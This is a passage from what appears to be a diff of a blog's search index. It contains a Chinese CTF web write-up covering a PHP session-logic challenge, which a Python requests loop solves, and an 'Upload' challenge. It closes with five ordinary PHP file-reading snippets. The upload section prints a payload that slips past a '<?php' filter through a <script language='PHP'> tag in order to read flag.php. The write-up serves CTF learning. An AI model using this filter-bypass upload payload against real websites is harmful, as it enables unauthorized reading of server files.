class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;<span class="comment">//a . b 并置 连接两个字符串 "Hi" . "Ha" HiHa</span></span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;<span class="comment">//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;<span class="comment">//substr(string,start,length)</span></span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明了了，因为$_SESSION[‘nums’] = 0，我们只需将上面的if语句循环十次（即$_SESSION[‘nums’]++循环十次），即可得出flag。<br>接下来就来构造语句，一开始的$_SESSION[‘whoami’] = ‘ea’，因此就构造</p><pre><code>?value[0]=e&amp;value[1]=a</code></pre><p>又因为每执行一次，$_SESSION[‘whoami’]会变化而且值与$str_rands相同，并且每执行一次都会输出$str_rands的值，因此只要按照这个顺序输入十次即可得出flag。<br>可以写一个脚本来跑出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://8e7202f5492447d5ab76eb8b7e8b4b27838e55901eba4c5f.changame.ichunqiu.com'</span></span><br><span class="line"><span class="comment"># 创建一个session对象  </span></span><br><span class="line">session=requests.Session()</span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">html=session.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+ html[<span class="number">0</span>:<span class="number">2</span>]).text</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>可以上传任意文件，并且上传之后可以打开文件（源码有链接/u/xx.php），想到上传一段php代码来打开flag.php页面:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure><p>但是发现&lt;?php被过滤了，使用script绕过和大小写绕过：</p><pre><code>&lt;script language=&quot;PHP&quot;&gt;$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&apos;r&apos;);echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;))); fclose($fh);&lt;/script&gt;</code></pre><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'here_is_flag'</span>;</span><br><span class="line"><span class="string">'flag&#123;05b17e33-2b22-4619-a245-b71c7ef2b1f8&#125;'</span>;</span><br></pre></td></tr></table></figure><p>PHP读取文件内容的五种方式：<br>第一种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">$str = fread($fp,filesize($file_path));<span class="comment">//指定读取大小，这里把整个文件内容读取出来</span></span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line">$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">$str = file_get_contents($file_path);<span class="comment">//将整个文件内容读入到一个字符串中</span></span><br><span class="line">$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line">$str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第三种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line">$buffer = <span class="number">1024</span>;<span class="comment">//每次读取 1024 字节</span></span><br><span class="line"><span class="keyword">while</span>(!feof($fp))&#123;<span class="comment">//循环读取，直至读取完整个文件</span></span><br><span class="line">$str.= fread($fp,$buffer);</span><br><span class="line">&#125;</span><br><span class="line">$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line">$str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第四种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">$file_arr = file($file_path);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($file_arr);$i++)&#123;<span class="comment">//逐行读取文件内容</span></span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line">$file_arr[$i].<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">foreach($file_arr as $value)&#123;</span></span><br><span class="line"><span class="comment">echo $value."&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第五种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span>(!feof($fp))&#123;</span><br><span class="line">$str.= fgets($fp);<span class="comment">//逐行读取。如果fgets不写length参数，默认是读取1k。</span></span><br><span class="line">&#125;</span><br><span class="line">$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line">$str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>writeup</category>
+          
+          <category> writeup </category>
+          
       </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
